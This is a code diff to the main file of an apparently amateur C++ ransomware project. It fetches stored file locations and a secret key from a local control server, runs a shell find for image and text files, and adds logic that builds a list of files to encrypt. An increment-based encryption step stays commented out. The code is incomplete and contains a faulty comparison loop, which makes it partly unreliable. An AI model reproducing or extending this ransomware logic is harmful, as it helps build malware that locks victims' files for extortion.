@@ -1,21 +1,27 @@
 #include <string>
 #include <iostream>
 #include <fstream>
+#include <sstream>
 #include <vector>
 #include "ransomMethods.h"
+
+
 
 int main(){  
 	std::vector<std::string> fileLocationsVector;
 	std::vector<std::vector<std::string>> fileContentVector;
-	std::string serverStoredLocations = get_request("http://127.0.0.1:5000/locations");
+	std::string serverStoredLocationsRaw = get_request("http://127.0.0.1:5000/locations");
 	std::string secretKey = get_request("http://127.0.0.1:5000/secretKey");
 
 	system("find . -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document.
 
 
-	// TODO - Create function that compares fileLocationsVector with serverStoredLocations and removes already stored locations.
+	// TODO - Create function that compares fileLocationsVector with serverStoredLocationsRaw and removes already stored locations.
 
 	
+
+
+
 	if(getFileContents("fileLocations", fileLocationsVector)){ // Read file locations into a string vector.			
 		for(std::string& location : fileLocationsVector){
 			std::vector<std::string> temporaryVector;
@@ -25,6 +31,38 @@ int main(){
 			}			
 		}
     }
+    
+    std::vector<std::string> serverLocationsVector = hackyMessJsonSanitizer(serverStoredLocationsRaw);
+    std::vector<std::string> locationsToBeEncrypted;
+
+    for(int i = 0; i < fileLocationsVector.size(); i++){
+    	for(int j = 0; j < serverLocationsVector.size(); j++){
+    		if(fileLocationsVector[i].compare(serverLocationsVector[j]) != 0){
+    			std::cout << "fileLocationsVector[i]: " << fileLocationsVector[i] << std::endl;
+    			std::cout << "serverLocationsVector[j]: " << serverLocationsVector[j] << std::endl;
+    			locationsToBeEncrypted.push_back(fileLocationsVector[i]);
+    		}
+    	}
+    }
+
+    if(locationsToBeEncrypted.size() > 0){
+ 		   	std::cout<< "some there";
+
+    }
+    else{
+    	std::cout << "none";
+    }
+
+    
+
+
+
+
+
+
+
+
+
 
 	/*	// ENCRYPT - Basic encryption. Just increments by one. Will change for asymmetric encryption.
 	for(vector<std::string>& file: fileContentVector){
